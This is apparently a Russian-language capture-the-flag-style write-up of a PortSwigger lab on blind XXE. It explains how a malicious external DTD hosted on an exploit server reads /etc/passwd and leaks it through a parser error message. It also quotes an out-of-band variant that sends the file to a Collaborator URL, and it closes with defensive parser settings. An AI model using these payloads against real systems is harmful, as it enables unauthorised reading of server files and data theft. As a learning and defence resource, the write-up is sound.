# Lab: Blind XXE with data exfiltration via error messages

**Платформа:** PortSwigger Web Security Academy
**Категория:** XXE (XML External Entity)
**Сложность:** Practitioner
**Дата:** 2026-07-29

---

## TL;DR
Функция «Check stock» парсит XML, но не отражает результат.
В отличие от предыдущей лабы, здесь не нужен Burp Collaborator —
содержимое файла `/etc/passwd` вытаскивается через **сообщение об
ошибке парсера**. Вредоносный внешний DTD читает файл, затем
намеренно подставляет его содержимое в **несуществующий путь**
к файлу — парсер бросает исключение "файл не найден", и в текст
этого исключения попадает весь путь целиком, включая содержимое
`/etc/passwd`. Ошибка отображается прямо в HTTP-ответе приложения.

---

## Отличие от предыдущей лабы (эксфильтрация через Collaborator)

```
Предыдущая лаба (OOB через Collaborator):
%exfil SYSTEM "http://collaborator/?x=%file;"
→ парсер сам делает HTTP-запрос наружу с содержимым файла
→ нужен внешний сервер, принимающий этот запрос (Collaborator)

Эта лаба (эксфильтрация через ошибку):
%exfil SYSTEM "file:///invalid/%file;"
→ путь заведомо не существует → парсер бросает ошибку
→ текст ошибки (с содержимым файла) возвращается
  ПРЯМО В ОТВЕТЕ приложения, никакого внешнего канала не нужно
```

Оба случая используют одну и ту же связку `%file → %eval → %exfil`
во внешнем DTD (см. предыдущую лабу про Collaborator) — отличается
только то, куда подставляется прочитанное содержимое: в URL наружу
или в путь к несуществующему локальному файлу.

## Разведка

### Шаг 1 — Анализ запроса «Check stock»

На странице товара нажала **Check stock**, перехватила запрос в Burp:

```http
POST /product/stock HTTP/2
Host: LAB-ID.web-security-academy.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

Ответ обычно ничего не отражает — но при синтаксической или
файловой ошибке в XML-парсинге приложение выводит сообщение
об исключении. Это и есть канал утечки в этой лабе.

[Запрос Check stock в Burp Repeater](./images/03-01-request-in-burp.png)

### Шаг 2 — Идея: спровоцировать ошибку с содержимым файла внутри

Если подставить содержимое `/etc/passwd` в качестве пути к файлу,
которого не существует, — сообщение об ошибке парсера обычно
включает в себя весь путь, который он пытался открыть. Значит,
если этот "путь" содержит текст файла — текст файла окажется
прямо в тексте ошибки.

## Эксплуатация

### Шаг 3 — Составление вредоносного внешнего DTD

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

Разбор по шагам:

```
%file   — читает содержимое /etc/passwd в параметрическую сущность

%eval   — значение — это ТЕКСТ, описывающий новое объявление
          сущности %exfil. В её SYSTEM-пути уже подставлен %file,
          но путь начинается с заведомо несуществующей директории
          "/invalid/" — то есть итоговый "путь" будет выглядеть
          примерно как file:///invalid/root:x:0:0:root:/root:/bin/bash...
          &#x25; — закодированный "%", чтобы % не разворачивался
          как сущность раньше времени (отложенная подстановка,
          как и в лабе с Collaborator)

%eval;  — вызываем → парсер создаёт новую сущность %exfil
          с "путём", в который зашито содержимое /etc/passwd

%exfil; — вызываем новую сущность → парсер пытается открыть
          этот несуществующий файл → падает с ошибкой →
          текст ошибки включает весь путь, то есть содержимое
          /etc/passwd целиком
```

Сохранила этот файл как `exploit.dtd`.

### Шаг 5 — Формирование запроса к лабе

Вернулась к перехваченному запросу **Check stock**, добавила
ссылку на внешний DTD между XML-декларацией и элементом
`stockCheck`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [
  <!ENTITY % xxe SYSTEM "https://EXPLOIT-SERVER-ID.exploit-server.net/exploit.dtd">
  %xxe;
]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

`%xxe` — единственная параметрическая сущность во внутреннем
DTD запроса, просто ссылка на внешний файл. Вся логика
чтения файла и провоцирования ошибки выполняется уже внутри
внешнего DTD.

[Модифицированный запрос с ссылкой на внешний DTD](./images/03-03-payload.png)

### Шаг 6 — Получение содержимого файла из ответа

Отправила запрос через Burp Repeater.

```
Ожидаемый результат в HTTP-ответе:
Сообщение об ошибке парсера (например, "java.io.FileNotFoundException"
или аналог), в тексте которого содержится путь вида
/invalid/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

В ответе приложения сразу увидела текст ошибки с полным
содержимым `/etc/passwd` — никакого Collaborator не понадобилось,
всё пришло синхронно в самом HTTP-ответе. Лаба решена.

## Итог

```
Проблема: ответ приложения обычно не отражает результат
          парсинга XML — НО отражает текст исключений парсера,
          если они возникают

Приём:    прочитанное содержимое файла подставляется как часть
          ПУТИ к заведомо несуществующему файлу
          → парсер бросает ошибку с этим путём в тексте
          → содержимое файла "утекает" через текст ошибки,
            без необходимости в внеполосном канале

Условие:  работает только если приложение действительно
          показывает пользователю подробности исключения
          (stack trace / сообщение об ошибке), а не generic 500
```

### Сравнение техник эксфильтрации при слепом XXE

```
Через Collaborator (OOB):
+ работает даже если ошибки полностью скрыты от пользователя
- нужен внешний сервер и второй шаг (Poll now)

Через сообщение об ошибке (эта лаба):
+ результат виден сразу в HTTP-ответе, без Collaborator
- работает только если приложение выводит текст ошибки парсера
  пользователю
```

## Защита

```python
# УЯЗВИМО — исключения парсера пробрасываются пользователю как есть:
try:
    tree = etree.parse(request_body, parser)
except Exception as e:
    return HttpResponse(str(e), status=400)  # текст ошибки виден снаружи

# БЕЗОПАСНО — генерик-ошибка наружу, детали только в серверный лог:
try:
    tree = etree.parse(request_body, parser)
except Exception as e:
    logger.error("XML parse error", exc_info=e)  # детали остаются внутри
    return HttpResponse("Invalid request", status=400)
```

```python
# И, как всегда, в первую очередь — отключить DTD и внешние сущности
# на уровне самого парсера, а не полагаться на маскировку ошибок:
parser = etree.XMLParser(
    resolve_entities=False,
    no_network=True,
    dtd_validation=False,
    load_dtd=False,
)
```

Дополнительно:
- Не показывать пользователю сырые сообщения об исключениях —
  это отдельный, независимый от XXE канал утечки данных
  (path traversal, SQL-ошибки и т.д. эксплуатируются так же)
- Полностью отключать `DOCTYPE`/DTD парсинг там, где он не нужен —
  тогда ни OOB-, ни error-based эксфильтрация не сработают вообще
- Логировать полный traceback только на сервере, наружу — общий
  код ошибки без деталей
- Egress-фильтрация и мониторинг исходящих соединений остаются
  актуальны для случаев, где error-based канал недоступен
